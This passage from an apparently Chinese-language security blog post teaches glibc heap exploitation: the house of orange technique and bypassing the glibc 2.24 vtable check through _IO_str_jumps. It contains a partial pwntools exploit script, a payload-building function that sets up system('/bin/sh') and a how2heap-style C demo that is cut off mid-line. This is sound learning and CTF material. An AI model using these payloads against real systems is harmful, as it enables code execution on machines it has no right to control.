bk_nextsize</span></span><br><span class="line">upgrade(<span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;2&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = myu64(io.recvn(<span class="number">6</span>)) - <span class="number">0x140</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + <span class="built_in">hex</span>(heap_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     break *0x555555554000+0x13FD </span></span><br><span class="line"><span class="comment">#     break *0x555555554000+0x01415</span></span><br><span class="line"><span class="comment">#     &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0x1f</span>) + p32(<span class="number">0x1</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stream = house_of_orange(<span class="number">0x555555758570</span>,libc.symbols[<span class="string">&#x27;system&#x27;</span>],libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># stream = &#x27;/bin/sh\0&#x27; + p64(0x61)</span></span><br><span class="line"><span class="comment"># stream += p64(0) + p64(libc.symbols[&#x27;_IO_list_all&#x27;] - 0x10)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stream = stream.ljust(0xa0, &#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># ## fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment"># stream += p64(heap_addr + 0x610)</span></span><br><span class="line"><span class="comment"># stream = stream.ljust(0xc0, &#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># stream += p64(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pay += stream</span></span><br><span class="line"><span class="comment"># pay += p64(0) * 2</span></span><br><span class="line"><span class="comment"># ## vtable</span></span><br><span class="line"><span class="comment"># pay += p64(heap_addr + 0x668)</span></span><br><span class="line"><span class="comment"># pay += p64(0) * 6</span></span><br><span class="line"><span class="comment"># pay += p64(libc.symbols[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">pay += stream</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">upgrade(pay, <span class="number">0x800</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x03-houseoforange-glibc-2-24-bypass"><a href="#0x03-houseoforange-glibc-2-24-bypass" class="headerlink" title="0x03 houseoforange (glibc 2.24 bypass)"></a>0x03 houseoforange (glibc 2.24 bypass)</h2><p>在 glibc 2.24 中新增了对 vtable 的check。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>首先，计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable -  __start___libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length ,即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两段 check：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-1da6fe6aac1d5307475c7d14d5bc72b5-e1e753.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-1da6fe6aac1d5307475c7d14d5bc72b5-e1e753.png"></a></p>
<p>这里，angelboy 提出来了两种bypass 方法</p>
<ul>
<li><p>overwrite IO_accept_foreign_vtables </p>
<p>由于有 PTR_DEMANGLE(flag) 的存在，很难bypass</p>
</li>
<li><p>overwrite _dl_open_hook</p>
<p>这是一个不错的选项，但是如果我们能覆盖 <code>_dl_open_hook</code> 意味着，我们能控制其他更好的内容。</p>
</li>
</ul>
<p>此时就把视角转移到了 <code> _IO_FILE</code> 结构体上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p>
<p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。这种方法，留到下一个小个地方写，这里要写的是另外一种方法</p>
<p>或者将视角移到了其他的 vtable 中，在 libc 中不仅仅有 <code>_IO_file_jumps</code> 这么一个 vtable ，还有<code>_IO_str_jumps</code> ，其虚表结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>以 <code>_IO_str_overflow</code> 为例：当我们将文件指针的<code>vtable</code>设置为<code>_IO_str_jumps</code></p>
<h3 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">// must bypass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) <span class="comment">// should enter here</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// must bypass</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">char</span> *new_buf;</span><br><span class="line">	  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen) <span class="comment">// pass 一般check 为真</span></span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf</span><br><span class="line">	    = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用以下代码来劫持程序流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure>



<p>在 <code>_IO_str_overflow</code> ，有几个条件需要满足</p>
<ul>
<li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li>
<li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li>
<li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li>
<li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li>
<li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li>
<li>fp+0xe0指向system地址</li>
</ul>
<p>总结bypass如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_flags &#x3D; 0</span><br><span class="line">_IO_write_base &#x3D; 0</span><br><span class="line">_IO_write_ptr &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 +1</span><br><span class="line">_IO_buf_end &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 </span><br><span class="line"></span><br><span class="line">_freeres_list &#x3D; 0x2</span><br><span class="line">_freeres_buf &#x3D; 0x3</span><br><span class="line">_mode &#x3D; -1</span><br><span class="line"></span><br><span class="line">vtable &#x3D; _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure>

<p>关键paylaod 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def VtableCheckBypass(vtable_addr, system_addr, binsh_addr, io_list_all_addr):</span><br><span class="line">	payload &#x3D; p64(0) + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)</span><br><span class="line">	payload +&#x3D; p64(0) + p64((binsh_addr - 100) &#x2F; 2 + 1) + p64(0) + p64(0) + p64((binsh_addr - 100) &#x2F; 2) + p64(0) * 6 + p64(0) + p64(0) * 4</span><br><span class="line">	payload +&#x3D; p64(0) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(vtable_addr - 0x18) + p64(system_addr)</span><br><span class="line">	return payload</span><br></pre></td></tr></table></figure>

<h3 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -&gt; finish"></a>_IO_str_jumps -&gt; finish</h3><p>原理与上面的 _IO_str_jumps -&gt; overflow 类似</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>条件：</p>
<ol>
<li>_IO_buf_base不为空</li>
<li>_flags &amp; _IO_USER_BUF(0x01) 为假</li>
</ol>
<p>构造如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure>



<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line">    <span class="comment">// unsorted bin attack</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// _IO_str_finish conditions</span></span><br><span class="line">    <span class="keyword">char</span> binsh_in_libc[] = <span class="string">&quot;/bin/sh\x00&quot;</span>; <span class="comment">// we can found &quot;/bin/sh&quot; in libc, here i create it in stack</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">0</span>] = ((<span class="keyword">size_t</span>) &amp;binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line">    top[<span class="number">7</span>] = ((<span class="keyword">size_t</span>)&amp;binsh_in_libc); <span class="comment">// buf_base</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// house_of_orange conditions</span></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line">    top[<span class="number">5</span>] = <span class="number">0x1</span> 